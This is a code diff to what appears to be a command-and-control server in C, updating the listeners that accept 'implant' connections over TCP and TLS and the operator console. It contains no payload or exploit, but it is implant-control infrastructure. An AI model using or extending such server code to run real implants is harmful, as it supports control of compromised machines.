@@ -34,7 +34,11 @@ void* tcp_ssl_listener(void *args) {
     int PORT = Args->port;
     strncpy(cert, Args->cert, BUFFER_SIZE);
     strncpy(key, Args->key, BUFFER_SIZE);
-    free(args);
+
+    if (access(cert, F_OK) != 0 || access(key, F_OK) != 0) {
+        generate_key_and_cert(cert, key);
+        log_message(LOG_INFO, "Create new certification and key");
+    }
 
     // create TCP socket
     int serverSock = socket(AF_INET, SOCK_STREAM, 0);
@@ -44,6 +48,13 @@ void* tcp_ssl_listener(void *args) {
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons(PORT);
+
+    int opt = 1;
+    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        log_message(LOG_ERROR, "setsockopt(SO_REUSEADDR) [TCP SSL] failed");
+        close(serverSock);
+        return NULL;
+    }
 
     if (bind(serverSock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
         log_message(LOG_ERROR, "Binding Failed [TCP SSL]| Port : %d", PORT); close(serverSock); return NULL;
@@ -61,7 +72,8 @@ void* tcp_ssl_listener(void *args) {
 
     if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ||
         SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0) {
-        ERR_print_errors_fp(stderr);
+        //ERR_print_errors_fp(stderr);
+        log_message(LOG_ERROR, "Failed to load ssl certification and key");
         SSL_CTX_free(ctx);
         return NULL;
     }
@@ -72,19 +84,20 @@ void* tcp_ssl_listener(void *args) {
         int agentSock = accept(serverSock, (struct sockaddr*)&client_addr, &len);
         if (agentSock < 0) { log_message(LOG_WARN, "Accept Faild [TCP SSL]"); continue; }
 
-        struct implant_handler_t *args = malloc(sizeof(*args));
-        args->ctx = ctx;
-        args->client_fd = agentSock;
-        strcpy(args->ip, inet_ntoa(client_addr.sin_addr));
-        args->encrypted = true;
+        struct implant_handler_t *Iargs = malloc(sizeof(*Iargs));
+        Iargs->ctx = ctx;
+        Iargs->client_fd = agentSock;
+        strcpy(Iargs->ip, inet_ntoa(client_addr.sin_addr));
+        Iargs->encrypted = true;
+        Iargs->db_conf = Args->db_conf;
 
         pthread_t thread;
-        if (pthread_create(&thread, NULL, implant_handler, args) < 0) {
+        if (pthread_create(&thread, NULL, implant_handler, Iargs) < 0) {
             //perror("Thread creation failed");
             log_message(LOG_ERROR, "TCP (SSL) Thread creation failed");
             
             close(agentSock);
-            free(args);
+            free(Iargs);
             continue;
         }
         pthread_detach(thread);
@@ -108,6 +121,14 @@ void* tcp_listener(void *args) {
         sleep(60);
         return NULL;
     }
+
+    int opt = 1;
+    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        log_message(LOG_ERROR, "setsockopt(SO_REUSEADDR) [TCP] failed");
+        close(serverSock);
+        return NULL;
+    }
+
 
     struct sockaddr_in serverAddr;
     serverAddr.sin_addr.s_addr = INADDR_ANY;
@@ -140,6 +161,7 @@ void* tcp_listener(void *args) {
         args->client_fd = sock;
         strcpy(args->ip, inet_ntoa(clientAddr.sin_addr));
         args->encrypted = false;        
+        args->db_conf = Args->db_conf;
 
         if (pthread_create(&thread, NULL, implant_handler, (void*)args) < 0) {
             log_message(LOG_ERROR, "TCP Thread creation failed");
@@ -158,9 +180,7 @@ void *operator_listener(void* args) {
     init();
 
     struct main_threads_args_t *Args = (struct main_threads_args_t*)args;
-
-
-
+  
     char cert[BUFFER_SIZE];
     char key[BUFFER_SIZE];
     int OPERATOR_PORT = Args->port;
@@ -173,30 +193,41 @@ void *operator_listener(void* args) {
         generate_key_and_cert(cert, key);
         log_message(LOG_ERROR, "Create new certification and key");
     }
-    free(args);
 
-    struct sockaddr_in clientAddr;
-    socklen_t client_len = sizeof(clientAddr);
+ 
     int serverSock;
-
-
 
     serverSock = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSock == -1) {
         log_message(LOG_ERROR, "Socket creation failed for operator console");
-        sleep(60);
+        return NULL;
+    }  
+
+    struct sockaddr_in clientAddr;
+    socklen_t client_len = sizeof(clientAddr);
+
+    struct sockaddr_in serverAddr;
+    memset(&serverAddr, 0, sizeof(serverAddr)); // Clear structure
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_port = htons(OPERATOR_PORT);
+
+
+    int opt = 1;
+    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        log_message(LOG_ERROR, "setsockopt(SO_REUSEADDR) [Operator Listener] failed : %s", strerror(errno));
+        close(serverSock);
         return NULL;
     }
 
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
-    serverAddr.sin_port = htons(OPERATOR_PORT);
-    serverAddr.sin_family = AF_INET;
-
-    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
-        log_message(LOG_ERROR ,"binding failed For operator console");
+// Check if port is already in use before binding
+    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+        if (errno == EADDRINUSE) {
+            log_message(LOG_ERROR, "Port %d already in use for Operator console", OPERATOR_PORT);
+        } else {
+            log_message(LOG_ERROR, "Binding failed for Operator console: %s", strerror(errno));
+        }
         close(serverSock);
-        sleep(60);
         return NULL;
     }
 
@@ -224,7 +255,7 @@ void *operator_listener(void* args) {
     int sock;
     while (1) {
         if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
-            log_message(LOG_ERROR, "Accept failed");
+            log_message(LOG_ERROR, "Operator Accept failed");
             continue;
         }
         
@@ -244,11 +275,13 @@ void *operator_listener(void* args) {
 
         struct operator_handler_args_t *args = malloc(sizeof(*args));
         args->ssl = ssl;
-
+        args->db_conf = Args->db_conf;
+        
         pthread_t thread;
         if (pthread_create(&thread, NULL, operator_handler, (void*)args) < 0) {
             log_message(LOG_ERROR, "Failed to create operator thread");
             free(args);
+            args = NULL;
             continue;
         }
         log_message(LOG_INFO, "Operator Console connected successfully : Remote address : [%s:%d]", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
